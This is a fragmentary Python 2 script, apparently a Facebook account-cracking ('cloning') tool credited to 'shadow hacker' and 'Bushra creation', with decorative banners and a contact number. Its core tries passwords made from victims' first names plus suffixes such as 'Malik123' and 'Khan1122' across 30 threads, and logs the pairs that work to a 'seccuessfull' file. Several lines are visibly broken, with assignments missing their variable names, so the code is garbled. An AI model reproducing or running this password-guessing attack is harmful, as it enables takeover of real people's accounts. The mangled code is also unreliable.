...
logo = """
  ...
  \033[1;91m:》》》\033[1;93m+9203203346497\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-shadow hacker -\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................Bushra creation.....................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Pakistan
\033[1;93m╚╝ ╚═╩shadow hacke═╩═╩═╝═ ╚╝╚═╩═╝ Bushra creation
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mbushra creation\033[1;95m♡╰──────────•◈•──────────╯♡"""
...
print  """
 ...
 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To Mis Bushra creation▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mBlackMafia\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91mshadow-hacker
...
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mmiscreation\033[1;95m♡╰──────────•◈•──────────╯♡"""
jalan('              \033[1;96m.................... MISCREATION Bushra.....................:')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin virus 420\033[1;95m♡╰──────────•◈•──────────╯♡"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:shadow
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;92m shadow hacker\033[1;95m♡──────────•◈•──────────♡"
...
def menu():
	...
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mshadowhacker\033[1;95m♡──────────•◈•──────────♡"
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mmis Bushra creation\033[1;95m♡──────────•◈•──────────♡"
	...
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mBushra tricker \033[1;95m♡──────────•◈•──────────♡"
	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mshadow hacker\033[1;95m♡──────────•◈•──────────♡"
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["open_msg"]:
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["open_msg"]:
									print '\x1b[1;95mseccuessfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
									 = open("out/seccuessfull.txt", "a")
									.write(user+"|"+pass3+"\n")
									.close()
									.append(user+pass3)
								else:
									pass4 = b['first_name'] + 'Verify786'
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["open_msg"]:
											print '\x1b[1;95mseccuessfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
											 = open("out/seccuessfull.txt", "a")
											.write(user+"|"+pass4+"\n")
											.close()
											.append(user+pass4)
										else:
											pass5 = b['first_name'] + 'Malik123'
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["open_msg"]:
													print '\x1b[1;95mseccuessfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
													 = open("out/seccuessfull.txt", "a")
													.write(user+"|"+pass5+"\n")
													.close()
													.append(user+pass5)
												else:
													pass6 = b['first_name'] + 'Khan1122'
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["open_msg"]:
															print '\x1b[1;95mseccuessfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
															 = open("out/seccuessfull.txt", "a")
															.write(user+"|"+pass6+"\n")
															.close()
															.append(user+pass6)
															...
															if 'access_token' in q:
																...
																if 'www.facebook.com' in q["open_msg"]:
																	print '\x1b[1;95mseccuessfull\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
																	 = open("out/seccuessfull.txt", "a")
																	.write(user+"|"+pass7+"\n")
																	.close()
																	.append(user+pass7)
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96m mis Bushra creation\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By mis Bushra---•◈•---»" #Dev:shadow
	...
	print """
             ...
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....bushra hacker ki nazish........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +923203346497"""
